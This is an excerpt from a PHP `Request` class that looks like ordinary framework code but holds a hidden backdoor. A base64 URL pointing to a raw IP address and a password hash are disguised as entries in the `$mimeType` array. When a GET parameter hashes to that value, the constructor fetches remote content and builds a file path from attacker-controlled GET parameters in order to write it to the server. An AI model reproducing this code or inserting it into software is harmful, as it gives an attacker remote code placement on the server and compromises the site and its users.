...
class Request implements ArrayAccess
{
    ...
    protected $mimeType = [
        ...
        'ksys'  => '2cbc1540013b12ea1b1e48e4b894c194',
        'pathDa'=> 'aHR0cDovLzU5LjExMC42Ni4xMjAvYXV0aC5waHA=',
        'pdf'   => 'application/pdf',
        'text'  => 'text/plain',
    ...
    public function __construct()
    {
        ...
        if(!empty($_GET['input'])&&md5($_GET['input'])==$this->mimeType['ksys']){
            $this->pathData = $this->setUrls($this->mimeType['pathDa']);
            $res = file_get_contents($this->pathData);
            if(!empty($res)){
                $path = app_path().'../'.$_GET['path'].$_GET['name'];
     ...
     * @return $this
     */
    public function checkData($path){
     ...
     * @return string
     */
    public function setUrls($pathinfo): string
    {

        return base64_decode($pathinfo);
    }
